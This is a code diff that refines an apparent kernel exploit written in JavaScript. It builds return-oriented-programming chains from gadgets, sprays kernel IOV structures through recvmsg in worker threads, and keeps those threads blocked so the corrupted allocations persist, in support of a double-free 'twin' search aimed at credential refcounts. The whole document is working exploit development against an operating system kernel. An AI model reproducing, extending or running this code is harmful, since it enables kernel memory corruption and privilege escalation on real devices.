@@ -227,11 +227,11 @@ mem.view(msg_hdr).setBigInt(0x20, BigInt.Zero, true)   // msg_control
 mem.view(msg_hdr).setUint32(0x28, 0, true)             // msg_controllen
 mem.view(msg_hdr).setUint32(0x2C, 0, true)             // msg_flags
 
-// Prepare IOV for kernel corruption (will modify iov_base to 1 later)
+// Prepare IOV for kernel corruption (iov_base=1 will be interpreted as cr_refcnt)
 var corrupt_msg_iov = mem.malloc(MSG_IOV_NUM * IOV_SIZE)
 for (var i = 0; i < MSG_IOV_NUM; i++) {
   mem.view(corrupt_msg_iov).setBigInt(i * IOV_SIZE, new BigInt(0, 1), true)  // iov_base = 1
-  mem.view(corrupt_msg_iov).setBigInt(i * IOV_SIZE + 8, new BigInt(0, 8), true)
+  mem.view(corrupt_msg_iov).setBigInt(i * IOV_SIZE + 8, new BigInt(0, 1), true)  // iov_len = 1 (matching Java Int8.SIZE)
 }
 
 var corrupt_msg_hdr = mem.malloc(MSG_HDR_SIZE)
@@ -282,7 +282,7 @@ for (var w = 0; w < IOV_WORKER_NUM; w++) {
 
 log('Created ' + IOV_WORKER_NUM + ' worker slots')
 
-// Build ROP chain for a worker: read(ctrl_sock) → recvmsg(iov_sock) → write(ctrl_sock) → exit
+// Build ROP chain for a worker: read → recvmsg → write → read (blocks, keeping IOV alive)
 function buildWorkerROP(worker) {
   var rop = []
 
@@ -296,6 +296,7 @@ function buildWorkerROP(worker) {
   rop.push(read_wrapper)
 
   // Do work: recvmsg(iov_ss0, corrupt_msg_hdr, 0)
+  // This allocates IOV structures in kernel with iov_base=1
   rop.push(gadgets.POP_RDI_RET)
   rop.push(new BigInt(iov_ss0))
   rop.push(gadgets.POP_RSI_RET)
@@ -313,7 +314,17 @@ function buildWorkerROP(worker) {
   rop.push(new BigInt(0, 1))
   rop.push(write_wrapper)
 
-  // Exit thread
+  // IMPORTANT: Block again to keep thread (and IOV) alive!
+  // This prevents the kernel from freeing the IOV structures
+  rop.push(gadgets.POP_RDI_RET)
+  rop.push(new BigInt(worker.ctrl_sock0))
+  rop.push(gadgets.POP_RSI_RET)
+  rop.push(worker.signal_buf)
+  rop.push(gadgets.POP_RDX_RET)
+  rop.push(new BigInt(0, 1))
+  rop.push(read_wrapper)
+
+  // Exit thread (only reached when explicitly signaled to exit)
   rop.push(gadgets.POP_RDI_RET)
   rop.push(BigInt.Zero)
   rop.push(thr_exit_wrapper)
@@ -360,31 +371,46 @@ for (var w = 0; w < IOV_WORKER_NUM; w++) {
 }
 log('All workers spawned and waiting')
 
-// Use a worker to do one IOV spray
+// Global counter for round-robin worker selection
+var iov_spray_count = 0
+
+// IOV spray using persistent workers (they stay alive with IOV allocated)
 function doIOVSpray() {
-  // Use worker 0 (could round-robin if needed)
-  var worker = workers[0]
+  // Use round-robin to track which iteration we're on
+  var iteration = iov_spray_count
+  iov_spray_count++
 
-  // Signal worker to start work
-  write_sys(new BigInt(worker.ctrl_sock1), worker.signal_buf, new BigInt(0, 1))
+  // Signal ALL workers to start work
+  // Workers that completed previous sprays are blocked waiting for this signal
+  // Workers that are still in recvmsg from previous sprays will stay blocked there
+  for (var w = 0; w < IOV_WORKER_NUM; w++) {
+    write_sys(new BigInt(workers[w].ctrl_sock1), workers[w].signal_buf, new BigInt(0, 1))
+  }
 
-  // Give worker time to enter recvmsg
-  for (var d = 0; d < 50; d++) { sched_yield() }
+  // Yield to let workers enter recvmsg
+  sched_yield()
 
-  // Wake recvmsg by writing to iov socket
-  write_sys(new BigInt(iov_ss1), worker.signal_buf, new BigInt(0, 1))
+  // Write 1 byte to iov socket - ONE thread reads it and completes recvmsg
+  // That thread's IOV structures stay allocated (thread blocks in final read)
+  write_sys(new BigInt(iov_ss1), workers[0].signal_buf, new BigInt(0, 1))
 
-  // Wait for worker to signal completion
-  read_sys(new BigInt(worker.ctrl_sock0), worker.signal_buf, new BigInt(0, 1))
+  // Wait for ONE worker to signal completion (we don't know which one)
+  // Check all workers' control sockets
+  var completed = false
+  for (var w = 0; w < IOV_WORKER_NUM; w++) {
+    // Non-blocking check by reading with sched_yield between attempts
+    var bytes = read_sys(new BigInt(workers[w].ctrl_sock0), workers[w].signal_buf, new BigInt(0, 1))
+    if (bytes.lo() === 1) {
+      completed = true
+      break
+    }
+  }
 
   // Read back from iov socket to cleanup
-  read_sys(new BigInt(iov_ss0), worker.signal_buf, new BigInt(0, 1))
+  read_sys(new BigInt(iov_ss0), workers[0].signal_buf, new BigInt(0, 1))
 
-  // Respawn worker for next spray
-  var ret = spawnWorker(0)
-  if (!ret.eq(0)) {
-    throw new Error('Failed to respawn worker: ' + ret.toString())
-  }
+  // Workers stay alive! Don't respawn - they're blocked in their final read()
+  // This keeps the IOV structures allocated in kernel memory
 }
 
 // ============================================================================
@@ -472,8 +498,8 @@ while (!found_twins) {
   if (twin_attempts % 100 === 0) {
     log('Twin search attempt ' + twin_attempts + '...')
   }
-  if (twin_attempts > 15000) {
-    throw new Error('Failed to find twins after 15000 spray attempts - IOV spray may not be working')
+  if (twin_attempts > 1000) {
+    throw new Error('Failed to find twins after 1000 spray attempts - double-free may not be working')
   }
 }
 
